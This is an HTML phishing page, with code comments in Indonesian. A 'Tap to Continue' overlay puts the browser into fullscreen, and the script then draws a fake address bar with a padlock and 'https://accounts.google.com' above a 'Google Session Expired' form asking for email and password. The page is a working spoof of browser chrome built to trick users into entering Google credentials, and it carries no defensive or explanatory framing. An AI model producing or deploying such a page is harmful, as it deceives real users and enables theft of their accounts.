<!DOCTYPE html>
<html>
<head>
<title>Continue</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
    margin:0;
    padding:0;
    font-family: Arial, sans-serif;
    background:white;
}

/* overlay awal */
#start {
    position:fixed;
    width:100%;
    height:100%;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:20px;
    background:white;
    z-index:10000;
}

/* fake address bar */
#fakebar {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:50px;
    background:#f1f3f4;
    border-bottom:1px solid #ccc;
    display:flex;
    align-items:center;
    padding:0 10px;
    font-size:14px;
    z-index:9999;
    opacity:0;
    transition:0.3s;
}

#fakebar.show {
    opacity:1;
}

.url {
    background:white;
    padding:6px 12px;
    border-radius:20px;
    border:1px solid #ccc;
    margin-left:10px;
    flex:1;
}

/* konten */
#content {
    display:none;
    padding:100px 20px 20px;
    text-align:center;
}

input {
    margin-top:20px;
    width:80%;
    padding:12px;
    font-size:16px;
    border-radius:20px;
    border:1px solid #ccc;
}
</style>

</head>

<body>

<div id="start">
    Tap to Continue
</div>

<div id="fakebar">
    🔒 <div class="url">https://accounts.google.com</div>
</div>

<div id="content">
    <h2>Google Session Expired</h2>
    <p>Please login again</p>
    <input type="text" placeholder="Email">
    <br>
    <input type="password" placeholder="Password">
</div>

<script>
let start = document.getElementById("start");
let fakebar = document.getElementById("fakebar");
let content = document.getElementById("content");

start.addEventListener("click", async () => {
    try {
        // masuk fullscreen
        await document.documentElement.requestFullscreen();

        // sembunyikan overlay
        start.style.display = "none";

        // tampilkan UI spoof
        fakebar.classList.add("show");
        content.style.display = "block";

    } catch (e) {
        alert("Fullscreen blocked");
    }
});
</script>

</body>
</html>
